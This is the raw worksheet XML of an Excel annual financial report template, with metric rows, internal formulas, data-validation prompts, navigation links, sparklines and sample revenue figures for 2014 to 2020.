      <c r="E26" s="85">
        <f ca="1">IF($B26="","",Calculations!F25)</f>
        <v>23.19</v>
      </c>
      <c r="F26" s="85"/>
      <c r="G26" s="85"/>
      <c r="H26" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>6.3820612332902149E-2</v>
      </c>
      <c r="I26" s="58"/>
      <c r="J26" s="58"/>
      <c r="K26" s="58"/>
      <c r="L26" s="58"/>
    </row>
    <row r="27" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B27" s="82" t="str">
        <f>Calculations!B26</f>
        <v>METRIC 4</v>
      </c>
      <c r="C27" s="82"/>
      <c r="D27" s="15">
        <f ca="1">IF($B27="","",Calculations!G26)</f>
        <v>13.76</v>
      </c>
      <c r="E27" s="85">
        <f ca="1">IF($B27="","",Calculations!F26)</f>
        <v>13.7</v>
      </c>
      <c r="F27" s="85"/>
      <c r="G27" s="85"/>
      <c r="H27" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>4.3795620437956373E-3</v>
      </c>
      <c r="I27" s="58"/>
      <c r="J27" s="58"/>
      <c r="K27" s="58"/>
      <c r="L27" s="58"/>
    </row>
    <row r="28" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B28" s="82" t="str">
        <f>Calculations!B27</f>
        <v>METRIC 5</v>
      </c>
      <c r="C28" s="82"/>
      <c r="D28" s="15">
        <f ca="1">IF($B28="","",Calculations!G27)</f>
        <v>0.91</v>
      </c>
      <c r="E28" s="85">
        <f ca="1">IF($B28="","",Calculations!F27)</f>
        <v>0.89</v>
      </c>
      <c r="F28" s="85"/>
      <c r="G28" s="85"/>
      <c r="H28" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>2.2471910112359605E-2</v>
      </c>
      <c r="I28" s="58"/>
      <c r="J28" s="58"/>
      <c r="K28" s="58"/>
      <c r="L28" s="58"/>
    </row>
    <row r="29" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B29" s="82" t="str">
        <f>Calculations!B28</f>
        <v>METRIC 6</v>
      </c>
      <c r="C29" s="82"/>
      <c r="D29" s="15">
        <f ca="1">IF($B29="","",Calculations!G28)</f>
        <v>0.28999999999999998</v>
      </c>
      <c r="E29" s="85">
        <f ca="1">IF($B29="","",Calculations!F28)</f>
        <v>0.28000000000000003</v>
      </c>
      <c r="F29" s="85"/>
      <c r="G29" s="85"/>
      <c r="H29" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>3.5714285714285587E-2</v>
      </c>
      <c r="I29" s="58"/>
      <c r="J29" s="58"/>
      <c r="K29" s="58"/>
      <c r="L29" s="58"/>
    </row>
    <row r="30" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B30" s="82" t="str">
        <f>Calculations!B29</f>
        <v/>
      </c>
      <c r="C30" s="82"/>
      <c r="D30" s="15" t="str">
        <f>IF($B30="","",Calculations!G29)</f>
        <v/>
      </c>
      <c r="E30" s="85" t="str">
        <f>IF($B30="","",Calculations!F29)</f>
        <v/>
      </c>
      <c r="F30" s="85"/>
      <c r="G30" s="85"/>
      <c r="H30" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I30" s="58"/>
      <c r="J30" s="58"/>
      <c r="K30" s="58"/>
      <c r="L30" s="58"/>
    </row>
    <row r="31" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B31" s="82" t="str">
        <f>Calculations!B30</f>
        <v/>
      </c>
      <c r="C31" s="82"/>
      <c r="D31" s="15" t="str">
        <f>IF($B31="","",Calculations!G30)</f>
        <v/>
      </c>
      <c r="E31" s="85" t="str">
        <f>IF($B31="","",Calculations!F30)</f>
        <v/>
      </c>
      <c r="F31" s="85"/>
      <c r="G31" s="85"/>
      <c r="H31" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I31" s="58"/>
      <c r="J31" s="58"/>
      <c r="K31" s="58"/>
      <c r="L31" s="58"/>
    </row>
    <row r="32" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B32" s="82" t="str">
        <f>Calculations!B31</f>
        <v/>
      </c>
      <c r="C32" s="82"/>
      <c r="D32" s="15" t="str">
        <f>IF($B32="","",Calculations!G31)</f>
        <v/>
      </c>
      <c r="E32" s="85" t="str">
        <f>IF($B32="","",Calculations!F31)</f>
        <v/>
      </c>
      <c r="F32" s="85"/>
      <c r="G32" s="85"/>
      <c r="H32" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I32" s="58"/>
      <c r="J32" s="58"/>
      <c r="K32" s="58"/>
      <c r="L32" s="58"/>
    </row>
    <row r="33" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B33" s="82" t="str">
        <f>Calculations!B32</f>
        <v/>
      </c>
      <c r="C33" s="82"/>
      <c r="D33" s="15" t="str">
        <f>IF($B33="","",Calculations!G32)</f>
        <v/>
      </c>
      <c r="E33" s="85" t="str">
        <f>IF($B33="","",Calculations!F32)</f>
        <v/>
      </c>
      <c r="F33" s="85"/>
      <c r="G33" s="85"/>
      <c r="H33" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I33" s="58"/>
      <c r="J33" s="58"/>
      <c r="K33" s="58"/>
      <c r="L33" s="58"/>
    </row>
    <row r="34" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B34" s="82" t="str">
        <f>Calculations!B33</f>
        <v/>
      </c>
      <c r="C34" s="82"/>
      <c r="D34" s="15" t="str">
        <f>IF($B34="","",Calculations!G33)</f>
        <v/>
      </c>
      <c r="E34" s="85" t="str">
        <f>IF($B34="","",Calculations!F33)</f>
        <v/>
      </c>
      <c r="F34" s="85"/>
      <c r="G34" s="85"/>
      <c r="H34" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I34" s="58"/>
      <c r="J34" s="58"/>
      <c r="K34" s="58"/>
      <c r="L34" s="58"/>
    </row>
    <row r="35" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B35" s="82" t="str">
        <f>Calculations!B34</f>
        <v/>
      </c>
      <c r="C35" s="82"/>
      <c r="D35" s="15" t="str">
        <f>IF($B35="","",Calculations!G34)</f>
        <v/>
      </c>
      <c r="E35" s="85" t="str">
        <f>IF($B35="","",Calculations!F34)</f>
        <v/>
      </c>
      <c r="F35" s="85"/>
      <c r="G35" s="85"/>
      <c r="H35" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I35" s="58"/>
      <c r="J35" s="58"/>
      <c r="K35" s="58"/>
      <c r="L35" s="58"/>
    </row>
    <row r="36" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B36" s="82" t="str">
        <f>Calculations!B35</f>
        <v/>
      </c>
      <c r="C36" s="82"/>
      <c r="D36" s="15" t="str">
        <f>IF($B36="","",Calculations!G35)</f>
        <v/>
      </c>
      <c r="E36" s="85" t="str">
        <f>IF($B36="","",Calculations!F35)</f>
        <v/>
      </c>
      <c r="F36" s="85"/>
      <c r="G36" s="85"/>
      <c r="H36" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I36" s="58"/>
      <c r="J36" s="58"/>
      <c r="K36" s="58"/>
      <c r="L36" s="58"/>
    </row>
    <row r="37" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B37" s="82" t="str">
        <f>Calculations!B36</f>
        <v/>
      </c>
      <c r="C37" s="82"/>
      <c r="D37" s="15" t="str">
        <f>IF($B37="","",Calculations!G36)</f>
        <v/>
      </c>
      <c r="E37" s="85" t="str">
        <f>IF($B37="","",Calculations!F36)</f>
        <v/>
      </c>
      <c r="F37" s="85"/>
      <c r="G37" s="85"/>
      <c r="H37" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I37" s="58"/>
      <c r="J37" s="58"/>
      <c r="K37" s="58"/>
      <c r="L37" s="58"/>
    </row>
    <row r="38" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B38" s="82" t="str">
        <f>Calculations!B37</f>
        <v/>
      </c>
      <c r="C38" s="82"/>
      <c r="D38" s="15" t="str">
        <f>IF($B38="","",Calculations!G37)</f>
        <v/>
      </c>
      <c r="E38" s="85" t="str">
        <f>IF($B38="","",Calculations!F37)</f>
        <v/>
      </c>
      <c r="F38" s="85"/>
      <c r="G38" s="85"/>
      <c r="H38" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I38" s="58"/>
      <c r="J38" s="58"/>
      <c r="K38" s="58"/>
      <c r="L38" s="58"/>
    </row>
    <row r="39" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B39" s="82" t="str">
        <f>Calculations!B38</f>
        <v/>
      </c>
      <c r="C39" s="82"/>
      <c r="D39" s="15" t="str">
        <f>IF($B39="","",Calculations!G38)</f>
        <v/>
      </c>
      <c r="E39" s="85" t="str">
        <f>IF($B39="","",Calculations!F38)</f>
        <v/>
      </c>
      <c r="F39" s="85"/>
      <c r="G39" s="85"/>
      <c r="H39" s="10" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I39" s="58"/>
      <c r="J39" s="58"/>
      <c r="K39" s="58"/>
      <c r="L39" s="58"/>
    </row>
    <row r="40" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B40" s="84" t="str">
        <f>Calculations!B39</f>
        <v/>
      </c>
      <c r="C40" s="84"/>
      <c r="D40" s="49" t="str">
        <f>IF($B40="","",Calculations!G39)</f>
        <v/>
      </c>
      <c r="E40" s="86" t="str">
        <f>IF($B40="","",Calculations!F39)</f>
        <v/>
      </c>
      <c r="F40" s="86"/>
      <c r="G40" s="86"/>
      <c r="H40" s="50" t="str">
        <f t="shared" si="0"/>
        <v/>
      </c>
      <c r="I40" s="59"/>
      <c r="J40" s="59"/>
      <c r="K40" s="59"/>
      <c r="L40" s="59"/>
    </row>
  </sheetData>
  <sheetProtection selectLockedCells="1"/>
  <mergeCells count="92">
    <mergeCell ref="E40:G40"/>
    <mergeCell ref="E15:G15"/>
    <mergeCell ref="J6:L6"/>
    <mergeCell ref="J11:L11"/>
    <mergeCell ref="B14:L14"/>
    <mergeCell ref="E27:G27"/>
    <mergeCell ref="E28:G28"/>
    <mergeCell ref="E29:G29"/>
    <mergeCell ref="E30:G30"/>
    <mergeCell ref="E31:G31"/>
    <mergeCell ref="E16:G16"/>
    <mergeCell ref="E17:G17"/>
    <mergeCell ref="E18:G18"/>
    <mergeCell ref="E19:G19"/>
    <mergeCell ref="E20:G20"/>
    <mergeCell ref="E21:G21"/>
    <mergeCell ref="E22:G22"/>
    <mergeCell ref="E23:G23"/>
    <mergeCell ref="E24:G24"/>
    <mergeCell ref="E25:G25"/>
    <mergeCell ref="E26:G26"/>
    <mergeCell ref="E32:G32"/>
    <mergeCell ref="E33:G33"/>
    <mergeCell ref="B38:C38"/>
    <mergeCell ref="B39:C39"/>
    <mergeCell ref="E39:G39"/>
    <mergeCell ref="E34:G34"/>
    <mergeCell ref="E35:G35"/>
    <mergeCell ref="E36:G36"/>
    <mergeCell ref="E37:G37"/>
    <mergeCell ref="E38:G38"/>
    <mergeCell ref="B40:C40"/>
    <mergeCell ref="B33:C33"/>
    <mergeCell ref="B34:C34"/>
    <mergeCell ref="B35:C35"/>
    <mergeCell ref="B36:C36"/>
    <mergeCell ref="B37:C37"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="B31:C31"/>
    <mergeCell ref="B32:C32"/>
    <mergeCell ref="B23:C23"/>
    <mergeCell ref="B24:C24"/>
    <mergeCell ref="B25:C25"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B18:C18"/>
    <mergeCell ref="B19:C19"/>
    <mergeCell ref="B20:C20"/>
    <mergeCell ref="B21:C21"/>
    <mergeCell ref="B22:C22"/>
    <mergeCell ref="B13:C13"/>
    <mergeCell ref="D13:L13"/>
    <mergeCell ref="B1:J2"/>
    <mergeCell ref="B3:L4"/>
    <mergeCell ref="I30:L30"/>
    <mergeCell ref="K2:L2"/>
    <mergeCell ref="J9:L9"/>
    <mergeCell ref="J8:L8"/>
    <mergeCell ref="J10:L10"/>
    <mergeCell ref="J7:L7"/>
    <mergeCell ref="B5:C5"/>
    <mergeCell ref="D5:L5"/>
    <mergeCell ref="B15:C15"/>
    <mergeCell ref="B16:C16"/>
    <mergeCell ref="B17:C17"/>
    <mergeCell ref="I15:L15"/>
    <mergeCell ref="I16:L16"/>
    <mergeCell ref="I17:L17"/>
    <mergeCell ref="I18:L18"/>
    <mergeCell ref="I19:L19"/>
    <mergeCell ref="I34:L34"/>
    <mergeCell ref="I20:L20"/>
    <mergeCell ref="I21:L21"/>
    <mergeCell ref="I27:L27"/>
    <mergeCell ref="I28:L28"/>
    <mergeCell ref="I29:L29"/>
    <mergeCell ref="I22:L22"/>
    <mergeCell ref="I23:L23"/>
    <mergeCell ref="I24:L24"/>
    <mergeCell ref="I25:L25"/>
    <mergeCell ref="I26:L26"/>
    <mergeCell ref="I31:L31"/>
    <mergeCell ref="I32:L32"/>
    <mergeCell ref="I33:L33"/>
    <mergeCell ref="I40:L40"/>
    <mergeCell ref="I35:L35"/>
    <mergeCell ref="I36:L36"/>
    <mergeCell ref="I37:L37"/>
    <mergeCell ref="I38:L38"/>
    <mergeCell ref="I39:L39"/>
  </mergeCells>
  <conditionalFormatting sqref="J9 D9 H9 F9 B9">
    <cfRule type="iconSet" priority="4">
      <iconSet iconSet="3Arrows">
        <cfvo type="percent" val="0"/>
        <cfvo type="num" val="0"/>
        <cfvo type="num" val="0" gte="0"/>
      </iconSet>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="H16:H17">
    <cfRule type="iconSet" priority="9">
      <iconSet iconSet="3Arrows">
        <cfvo type="percent" val="0"/>
        <cfvo type="num" val="0"/>
        <cfvo type="num" val="0" gte="0"/>
      </iconSet>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="H18:H40">
    <cfRule type="iconSet" priority="10">
      <iconSet iconSet="3Arrows">
        <cfvo type="percent" val="0"/>
        <cfvo type="num" val="0"/>
        <cfvo type="num" val="0" gte="0"/>
      </iconSet>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B16:B40 D16:E40 H16:I40">
    <cfRule type="expression" dxfId="2" priority="1">
      <formula>MOD(ROW(),2)=0</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="24">
    <dataValidation type="list" errorStyle="warning" allowBlank="1" showInputMessage="1" showErrorMessage="1" error="Select Year from the list. Select CANCEL, press ALT+DOWN ARROW for options, then DOWN ARROW and ENTER to make selection" prompt="Select Year in this cell. Press ALT+DOWN ARROW for options, then DOWN ARROW and ENTER to make selection" sqref="K2:L2" xr:uid="{00000000-0002-0000-0000-000000000000}">
      <formula1>lstYears</formula1>
    </dataValidation>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Create Annual Financial Report in this workbook. Select year in cell K2 in this worksheet, D5 to navigate to Key Metric worksheet and D13 to navigate to Financial Data worksheet" sqref="A1" xr:uid="{00000000-0002-0000-0000-000001000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Title of this worksheet is in this cell. Enter Company Name in cell below and select report year in cell at right. Tip is in cell N2 and N3" sqref="B1:J2" xr:uid="{00000000-0002-0000-0000-000002000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Enter Company Name in this cell" sqref="B3:L4" xr:uid="{00000000-0002-0000-0000-000003000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Select cell at right to navigate to Key Metric Settings worksheet" sqref="B5:C5" xr:uid="{00000000-0002-0000-0000-000004000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Navigation link to Key Metric Settings worksheet" sqref="D5:M5" xr:uid="{00000000-0002-0000-0000-000005000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Revenue, growth percent, and sparklines are automatically updated in cells below" sqref="B7" xr:uid="{00000000-0002-0000-0000-000006000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Total Revenue is automatically updated in this cell and growth percent in cell below" sqref="B8" xr:uid="{00000000-0002-0000-0000-000007000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Growth percent is automatically updated in this cell and sparkline in cell below" sqref="B9 D9 F9 H9 J9:L9" xr:uid="{00000000-0002-0000-0000-000008000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Net Profit, growth percent, and sparklines are automatically updated in cells below" sqref="D7" xr:uid="{00000000-0002-0000-0000-000009000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Net Profit is automatically updated in this cell and growth percent in cell below" sqref="D8" xr:uid="{00000000-0002-0000-0000-00000A000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Interest, growth percent, and sparklines are automatically updated in cells below" sqref="F7" xr:uid="{00000000-0002-0000-0000-00000B000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Interest is automatically updated in this cell and growth percent in cell below" sqref="F8" xr:uid="{00000000-0002-0000-0000-00000C000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Depreciation amount, growth percent, and sparklines are automatically updated in cells below" sqref="H7" xr:uid="{00000000-0002-0000-0000-00000D000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Depreciation amount is automatically updated in this cell and growth percent in cell below" sqref="H8" xr:uid="{00000000-0002-0000-0000-00000E000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Operating Profit, growth percent, and sparklines are automatically updated in cells below" sqref="J7:L7" xr:uid="{00000000-0002-0000-0000-00000F000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Operating Profit is automatically updated in this cell and growth percent in cell below" sqref="J8:L8" xr:uid="{00000000-0002-0000-0000-000010000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="All Metrics data will automatically be updated in table starting in cell B15" sqref="B13:C13" xr:uid="{00000000-0002-0000-0000-000011000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Metrics are automatically updated in this column under this heading" sqref="B15" xr:uid="{00000000-0002-0000-0000-000012000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Report Year figures are automatically updated in this column under this heading" sqref="D15" xr:uid="{00000000-0002-0000-0000-000013000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Previous Year figures are automatically updated in this column under this heading" sqref="E15" xr:uid="{00000000-0002-0000-0000-000014000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Percent Change and icon are automatically updated in this column under this heading" sqref="H15" xr:uid="{00000000-0002-0000-0000-000015000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="5 Year Trend line is automatically updated in this column under this heading" sqref="I15:L15" xr:uid="{00000000-0002-0000-0000-000016000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Navigation link to Financial Data Input worksheet" sqref="D13:L13" xr:uid="{00000000-0002-0000-0000-000017000000}"/>
  </dataValidations>
  <hyperlinks>
    <hyperlink ref="D5" location="'Key Metric Settings'!C5" tooltip="Select to navigate to Key Metrics Settings worksheet" display="Tap to change report Key Metrics" xr:uid="{00000000-0004-0000-0000-000000000000}"/>
    <hyperlink ref="D13:H13" location="'Financial Data Input'!B6" tooltip="Select to navigate to Financial Data Input worksheet" display="Do not modify the information below. Tap to enter Financial Data" xr:uid="{00000000-0004-0000-0000-000001000000}"/>
    <hyperlink ref="D5:L5" location="'Key Metric Settings'!A1" tooltip="Select to navigate to Key Metrics Settings worksheet" display="Tap to change report Key Metrics" xr:uid="{00000000-0004-0000-0000-000002000000}"/>
    <hyperlink ref="D13:L13" location="'Financial Data Input'!A1" tooltip="Select to navigate to Financial Data Input worksheet" display="Do not modify the information below. Tap to enter Financial Data" xr:uid="{00000000-0004-0000-0000-000003000000}"/>
  </hyperlinks>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup scale="65" orientation="portrait" r:id="rId1"/>
  <extLst>
    <ext xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" uri="{05C60535-1F16-4fd2-B633-F4F36F0B64E0}">
      <x14:sparklineGroups xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">
        <x14:sparklineGroup markers="1" xr2:uid="{00000000-0003-0000-0000-000000000000}">
          <x14:colorSeries theme="0" tint="-0.34998626667073579"/>
          <x14:colorNegative theme="5"/>
          <x14:colorAxis rgb="FF000000"/>
          <x14:colorMarkers theme="4" tint="-0.499984740745262"/>
          <x14:colorFirst theme="4" tint="0.39997558519241921"/>
          <x14:colorLast theme="4" tint="0.39997558519241921"/>
          <x14:colorHigh theme="4"/>
          <x14:colorLow theme="4"/>
          <x14:sparklines>
            <x14:sparkline>
              <xm:f>Calculations!C15:G15</xm:f>
              <xm:sqref>I16</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C16:G16</xm:f>
              <xm:sqref>I17</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C17:G17</xm:f>
              <xm:sqref>I18</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C18:G18</xm:f>
              <xm:sqref>I19</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C19:G19</xm:f>
              <xm:sqref>I20</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C20:G20</xm:f>
              <xm:sqref>I21</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C21:G21</xm:f>
              <xm:sqref>I22</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C22:G22</xm:f>
              <xm:sqref>I23</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C23:G23</xm:f>
              <xm:sqref>I24</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C24:G24</xm:f>
              <xm:sqref>I25</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C25:G25</xm:f>
              <xm:sqref>I26</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C26:G26</xm:f>
              <xm:sqref>I27</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C27:G27</xm:f>
              <xm:sqref>I28</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C28:G28</xm:f>
              <xm:sqref>I29</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C29:G29</xm:f>
              <xm:sqref>I30</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C30:G30</xm:f>
              <xm:sqref>I31</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C31:G31</xm:f>
              <xm:sqref>I32</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C32:G32</xm:f>
              <xm:sqref>I33</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C33:G33</xm:f>
              <xm:sqref>I34</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C34:G34</xm:f>
              <xm:sqref>I35</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C35:G35</xm:f>
              <xm:sqref>I36</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C36:G36</xm:f>
              <xm:sqref>I37</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C37:G37</xm:f>
              <xm:sqref>I38</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C38:G38</xm:f>
              <xm:sqref>I39</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C39:G39</xm:f>
              <xm:sqref>I40</xm:sqref>
            </x14:sparkline>
          </x14:sparklines>
        </x14:sparklineGroup>
        <x14:sparklineGroup displayEmptyCellsAs="gap" markers="1" first="1" last="1" xr2:uid="{00000000-0003-0000-0000-000001000000}">
          <x14:colorSeries theme="0" tint="-0.34998626667073579"/>
          <x14:colorNegative theme="5"/>
          <x14:colorAxis rgb="FF000000"/>
          <x14:colorMarkers theme="4" tint="-0.499984740745262"/>
          <x14:colorFirst theme="4" tint="-0.499984740745262"/>
          <x14:colorLast theme="4" tint="-0.499984740745262"/>
          <x14:colorHigh theme="4"/>
          <x14:colorLow theme="4"/>
          <x14:sparklines>
            <x14:sparkline>
              <xm:f>Calculations!C8:G8</xm:f>
              <xm:sqref>B10</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C9:G9</xm:f>
              <xm:sqref>D10</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C10:G10</xm:f>
              <xm:sqref>F10</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C11:G11</xm:f>
              <xm:sqref>H10</xm:sqref>
            </x14:sparkline>
            <x14:sparkline>
              <xm:f>Calculations!C12:G12</xm:f>
              <xm:sqref>J10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39997558519241921"/>
    <pageSetUpPr autoPageBreaks="0" fitToPage="1"/>
  </sheetPr>
  <dimension ref="B1:I30"/>
  <sheetViews>
    <sheetView showGridLines="0" zoomScaleNormal="100" workbookViewId="0">
      <pane ySplit="5" topLeftCell="A6" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.796875" defaultRowHeight="30" customHeight="1" x14ac:dyDescent="0.45"/>
  <cols>
    <col min="1" max="1" width="1.6640625" customWidth="1"/>
    <col min="2" max="2" width="21.33203125" customWidth="1"/>
    <col min="3" max="9" width="17.1328125" customWidth="1"/>
    <col min="10" max="10" width="1.6640625" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="2:9" ht="8.25" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B1" s="96" t="s">
        <v>5</v>
      </c>
      <c r="C1" s="96"/>
      <c r="D1" s="96"/>
      <c r="E1" s="96"/>
      <c r="F1" s="96"/>
      <c r="G1" s="96"/>
      <c r="H1" s="96"/>
      <c r="I1" s="96"/>
    </row>
    <row r="2" spans="2:9" ht="38.25" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B2" s="96"/>
      <c r="C2" s="96"/>
      <c r="D2" s="96"/>
      <c r="E2" s="96"/>
      <c r="F2" s="96"/>
      <c r="G2" s="96"/>
      <c r="H2" s="96"/>
      <c r="I2" s="96"/>
    </row>
    <row r="3" spans="2:9" ht="17.25" x14ac:dyDescent="0.45">
      <c r="B3" s="94" t="s">
        <v>29</v>
      </c>
      <c r="C3" s="94"/>
      <c r="D3" s="94"/>
      <c r="E3" s="94"/>
      <c r="F3" s="94"/>
      <c r="G3" s="94"/>
      <c r="H3" s="94"/>
      <c r="I3" s="94"/>
    </row>
    <row r="4" spans="2:9" ht="25.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B4" s="95" t="s">
        <v>33</v>
      </c>
      <c r="C4" s="95"/>
    </row>
    <row r="5" spans="2:9" ht="25.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B5" s="39" t="s">
        <v>6</v>
      </c>
      <c r="C5" s="40">
        <f ca="1">YEAR(TODAY())-6</f>
        <v>2014</v>
      </c>
      <c r="D5" s="40">
        <f ca="1">YEAR(TODAY())-5</f>
        <v>2015</v>
      </c>
      <c r="E5" s="40">
        <f ca="1">YEAR(TODAY())-4</f>
        <v>2016</v>
      </c>
      <c r="F5" s="40">
        <f ca="1">YEAR(TODAY())-3</f>
        <v>2017</v>
      </c>
      <c r="G5" s="40">
        <f ca="1">YEAR(TODAY())-2</f>
        <v>2018</v>
      </c>
      <c r="H5" s="40">
        <f ca="1">YEAR(TODAY())-1</f>
        <v>2019</v>
      </c>
      <c r="I5" s="41">
        <f ca="1">YEAR(TODAY())</f>
        <v>2020</v>
      </c>
    </row>
    <row r="6" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B6" s="42" t="s">
        <v>7</v>
      </c>
      <c r="C6" s="43">
        <v>125000</v>
      </c>
      <c r="D6" s="43">
        <v>134137.45000000001</v>
      </c>
      <c r="E6" s="43">
        <v>142728.38</v>
      </c>
      <c r="F6" s="43">
        <v>150687.46</v>
      </c>
      <c r="G6" s="43">
        <v>165044.56</v>
      </c>
      <c r="H6" s="43">
        <v>180026.63</v>
      </c>
      <c r="I6" s="44">
        <v>180583.88</v>
      </c>
    </row>
